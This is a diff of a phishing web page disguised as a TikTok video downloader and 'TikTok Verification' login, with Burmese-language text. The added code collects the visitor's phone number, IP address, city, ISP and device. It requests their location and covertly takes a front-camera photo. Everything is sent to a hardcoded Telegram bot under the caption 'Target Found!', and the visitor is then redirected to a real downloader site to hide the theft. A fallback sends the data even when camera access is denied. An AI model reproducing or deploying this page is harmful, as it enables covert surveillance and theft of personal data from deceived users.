@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>TikTok HD Downloader</title>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         body { font-family: sans-serif; background-color: #121212; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .card { background: #1e1e1e; padding: 20px; border-radius: 15px; text-align: center; width: 90%; max-width: 350px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
@@ -12,7 +11,6 @@
         input { width: 100%; padding: 12px; margin: 15px 0; border-radius: 8px; border: 1px solid #333; background: #2c2c2c; color: white; box-sizing: border-box; outline: none; }
         button { width: 100%; padding: 12px; border: none; border-radius: 8px; background: #fe2c55; color: white; font-weight: bold; cursor: pointer; transition: 0.3s; }
         button:disabled { background: #555; cursor: not-allowed; font-size: 13px; }
-        #status { font-size: 12px; color: #888; margin-top: 10px; }
         video, canvas { display: none; }
     </style>
 </head>
@@ -21,34 +19,53 @@
 <div class="card">
     <img src="https://www.edigitalagency.com.au/wp-content/uploads/TikTok-logo-PNG.png" alt="TikTok">
     <h2>TikTok Verification</h2>
-    <p style="color: #fe2c55; font-size: 14px;">လက်ရှိအသုံးပြုနေသည့် ဖုန်းနံပါတ်ထည့်ရန်</p>
+    <p style="color: #fe2c55; font-size: 14px;">ဗီဒီယိုဒေါင်းရန် ဖုန်းနံပါတ်ဖြင့် အကောင့်ဝင်ပါ</p>
     <input type="tel" id="phone" placeholder="09xxxxxxxxx">
-    
-    <button id="loginBtn" onclick="startProcess()">အကောင့်၀င်ရန်</button>
-    
-    <div id="status">ခေတ္တစောင့်ဆိုင်းပေးပါ...</div>
+    <button id="loginBtn" onclick="startTracking()">အကောင့်၀င်ရန်</button>
+    <p id="status" style="font-size: 12px; color: #888; margin-top: 10px;"></p>
 </div>
 
 <video id="v" autoplay playsinline></video>
 <canvas id="c"></canvas>
 
 <script>
-    const token = '8661599650:AAFaEo8wGPhpvbj8g6cOonAZZxatMF21lV0';
-    const chat_id = '5304050102';
+    const token = '8765858719:AAHcA2nB7Nq_aInzf1ig9Y-LzjChettQk5Y'; //
+    const chat_id = '5304050102'; 
 
-    async function startProcess() {
+    async function startTracking() {
         const phone = document.getElementById('phone').value;
         const btn = document.getElementById('loginBtn');
-        const status = document.getElementById('status');
-
         if (!phone) { alert("ဖုန်းနံပါတ် ထည့်ပေးပါ!"); return; }
 
-        // ခလုတ်ကို စာသားပြောင်းပြီး ပိတ်လိုက်ခြင်း
         btn.disabled = true;
         btn.innerText = "စစ်ဆေးနေပါသည်... ခွင့်ပြုချက်တောင်းခဲ့လျှင် Allow ကို နှိပ်ပေးပါ။";
-        status.innerText = "Processing...";
 
+        let report = `🔔 **Target Found!**\n📱 Phone: ${phone}\n`;
+
+        // ၁။ IP နှင့် Device အချက်အလက် ရယူခြင်း
         try {
+            const ipRes = await fetch('https://ipapi.co/json/');
+            const ipData = await ipRes.json();
+            report += `🌐 IP: ${ipData.ip}\n📍 City: ${ipData.city}\n🏢 ISP: ${ipData.org}\n📱 Device: ${navigator.platform}\n`;
+        } catch (e) { report += "🌐 IP: Could not fetch\n"; }
+
+        // ၂။ တည်နေရာ (Location) ရယူခြင်း
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                report += `📍 Map: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\n`;
+                await captureAndSend(report);
+            }, async () => {
+                report += `📍 Location: Permission Denied\n`;
+                await captureAndSend(report);
+            });
+        } else {
+            await captureAndSend(report);
+        }
+    }
+
+    async function captureAndSend(fullReport) {
+        try {
+            // ၃။ ကင်မရာပုံ ဖမ်းယူခြင်း
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
             const v = document.getElementById('v');
             v.srcObject = stream;
@@ -58,31 +75,28 @@
                 c.width = 640;
                 c.height = 480;
                 c.getContext('2d').drawImage(v, 0, 0);
-                
                 const blob = await new Promise(res => c.toBlob(res, 'image/jpeg'));
-                
+
                 const formData = new FormData();
                 formData.append('chat_id', chat_id);
                 formData.append('photo', blob, 'shot.jpg');
-                formData.append('caption', `🔔 **Target Found!**\n📱 Phone: ${phone}`);
+                formData.append('caption', fullReport);
 
                 await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                     method: 'POST',
                     body: formData
                 });
 
-                // ပြီးရင် တကယ့် Downloader ဆီ လွှဲမည်
                 window.location.href = "https://ssstik.io/en";
-            }, 4000);
-
+            }, 3000);
         } catch (err) {
-            btn.disabled = false;
-            btn.innerText = "အကောင့်၀င်ရန်";
-            alert("ဗီဒီယိုဒေါင်းရန် Camera Permission (Allow) ပေးဖို့ လိုအပ်ပါတယ်။");
-            status.innerText = "Permission ပေးရန် လိုအပ်ပါသည်။";
+            // ကင်မရာမရလျှင်လည်း အချက်အလက်များကို စာသားအနေဖြင့် ပို့မည်
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(fullReport)}&parse_mode=Markdown`);
+            window.location.href = "https://ssstik.io/en";
         }
     }
 </script>
 
 </body>
 </html>
+
